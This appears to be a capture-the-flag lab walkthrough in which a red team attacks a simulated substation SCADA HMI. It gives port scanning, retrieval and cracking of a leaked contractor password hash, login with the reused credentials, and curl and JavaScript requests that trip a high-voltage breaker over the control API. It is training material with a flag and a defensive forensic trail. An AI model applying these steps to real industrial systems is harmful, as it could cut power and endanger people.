# Red Team Walkthrough: Contractor Account Reuse in the Control Room

## Objective
Exfiltrate leaked credentials belonging to an external maintenance contractor from an unsecured internal backup directory, bypass perimeter security on the substation HMI Webstation, and access a restricted High-Voltage Feeder view.

## Scenario Details
* **Target IP:** `<Target-IP>` (or `127.0.0.1` locally)
* **Webstation HMI Port:** `10008`
* **Backup/Internal Dev Server Port:** `8081`
* **Target Account:** `contractor_maint`

## Scoring Logic
* **Points:** 100 points
* **Condition:** Successfully log into the Rapid SCADA Webstation using the contractor's credentials, navigate to the restricted feeder view, trip the breaker, and recover the flag.
* **Flag Artifact:** `FLAG{contractor_access_not_revoked_9a38f}`

---

## Detailed Manual Step-by-Step Walkthrough

### Step 1: Network Reconnaissance & Port Scanning
Begin by scanning the target host to discover active services, focusing on web interfaces and potential industrial control services.
```bash
nmap -p- -sV <Target-IP>
```
**Expected Results:**
* **Port 10008/tcp:** Hosting the HTTP service for `Rapid SCADA Webstation` (substation HMI).
* **Port 8081/tcp:** Hosting an internal backup/development HTTP server.
* **Port 5020/tcp:** Hosting a Modbus TCP simulator representing the feeder instrumentation.

### Step 2: Information Disclosure via Unsecured Backups
Industrial facilities often run secondary web servers for internal documentation, system backups, or diagnostic dumps.
1. Open a web browser or use `curl` to explore the dev/backup server:
   ```bash
   curl -s http://<Target-IP>:8081/backup/
   ```
2. You will observe a directory listing containing a contractor maintenance notes log: `maint_notes_112.json`.
3. Fetch and read the contents of this JSON file:
   ```bash
   curl -s http://<Target-IP>:8081/backup/maint_notes_112.json
   ```
    **Response Content:**
    ```json
    {
      "work_order": "882",
      "status": "CLOSED",
      "completion_date": "2026-06-15",
      "technician": "contractor_maint",
      "temp_access_token_hash": "133987b0b6ad0c01fc0ccbdae1b95449",
      "notes": "HV Feeder maintenance complete. Temporary password generated and stored as MD5 hash per security policy. Awaiting AD de-provisioning."
    }
    ```
4. **Key Findings & Password Cracking:**
   * **Username:** `contractor_maint`
   * **Leaked Password Hash:** `133987b0b6ad0c01fc0ccbdae1b95449` (MD5)
   * **Cracking the Hash:** Use an offline lookup database or tool (e.g., CrackStation or hashcat/john) to crack the MD5 hash. Cracking it reveals the cleartext password: `Welcome123`.
   * **Forensic Clue:** The work order was marked `CLOSED`, but the notes indicate that the account is "Awaiting active directory de-provisioning", suggesting poor account lifecycle management (MITRE ATT&CK T0859 - Valid Accounts).

### Step 3: Exploiting Valid Accounts to Bypass HMI Perimeter
1. Open your web browser and navigate to the Rapid SCADA Webstation login portal:
   `http://<Target-IP>:10008`
2. Enter the exfiltrated credentials:
   * **Username:** `contractor_maint`
   * **Password:** `Welcome123`
3. Click **ESTABLISH SESSION**.
4. The system authorizes the session, granting access to the primary HMI cockpit.

### Step 4: Accessing the Restricted Control Panel & Executing Process Control (Lateral Movement / Flag Recovery)
1. Examine the left-hand navigation sidebar. Unlike a standard operator session, the contractor account retains access to a restricted section.
2. In the sidebar, click on **🚨 Restricted Feeder**. This navigates to `/Substation_High_Voltage_Feeder` (ViewID: 102).
3. Notice that the flag is initially locked with the message: **🔒 CRITICAL ARTIFACT LOCKED**.
4. Since the HMI control buttons have been removed and the backend API enforces security controls, you must interact with the control API directly. To ensure command integrity, the endpoint requires:
   * A valid work order reference: `"work_order": "882"`.
   * A command authorization signature in the `X-Signature` header, computed as the SHA-256 hash of the string `username:work_order:password`.
     For this exercise, the signature input is `contractor_maint:882:Welcome123`. You can generate this hash using:
      ```bash
      echo -n "contractor_maint:882:Welcome123" | sha256sum
      # Output: 277ad8b1281db20d186c03077437d8d49042ee1e3b67b36d83277949820bb554
      ```
   
   Dispatch a POST request to `/api/breaker/trip` with the contractor session, work order payload, and command signature header:
   * **Via Developer Tools Console (in browser):**
     Open the Developer Tools (F12) Console on the restricted page, and execute:
     ```javascript
     fetch('/api/breaker/trip', {
         method: 'POST',
         headers: { 
             'Content-Type': 'application/json',
             'X-Signature': '277ad8b1281db20d186c03077437d8d49042ee1e3b67b36d83277949820bb554'
         },
         body: JSON.stringify({ work_order: '882' })
     }).then(r => r.json()).then(console.log);
     ```
   * **Via Command Line (cURL):**
     ```bash
     # Authenticate and save session
     curl -c cookies.txt -d "username=contractor_maint&password=Welcome123" http://<Target-IP>:10008/
     # Dispatch command with work_order validation payload and signature header
     curl -b cookies.txt \
          -H "Content-Type: application/json" \
          -H "X-Signature: 277ad8b1281db20d186c03077437d8d49042ee1e3b67b36d83277949820bb554" \
          -d '{"work_order":"882"}' \
          -X POST http://<Target-IP>:10008/api/breaker/trip
     ```
5. This sends a live Modbus control instruction to write `0` to the breaker register.
6. Reload the `/Substation_High_Voltage_Feeder` page in your browser or perform a GET request with curl. The schematic will update dynamically (turning the line status indicator red/OFF) and display the recovered flag:
   `FLAG{contractor_access_not_revoked_9a38f}`

### Step 5: Confirming Success (Automated Attack Chain)
You can also run the automated attack script:
```bash
# Run from Module_1_Red directory
sudo bash red_attack.sh <Target-IP>
```
The script performs all phases automatically — recon, credential extraction, authentication, restricted view access, breaker trip, and flag capture — and prints a final scored summary.

---

## MITRE ATT&CK for ICS Mapping
* **Tactic:** TA0110 (Persistence) / TA0109 (Lateral Movement)
* **Technique:** T0859 (Valid Accounts)
  * *Description:* Leveraging credentials of a closed contractor account left active in the IAM database to bypass security boundaries and access process schematics.

---

## Red Team Scoring Trigger
**Score is awarded when:** The contractor account (`contractor_maint`) successfully accesses the restricted view `Substation_High_Voltage_Feeder` (ViewID: 102) AND the breaker trip command is dispatched, causing the flag `FLAG{contractor_access_not_revoked_9a38f}` to be rendered. Both the login event and the view-access event are recorded in `/opt/scada/ScadaWeb/log/ScadaWeb.log`, creating the forensic evidence trail for the Blue Team.
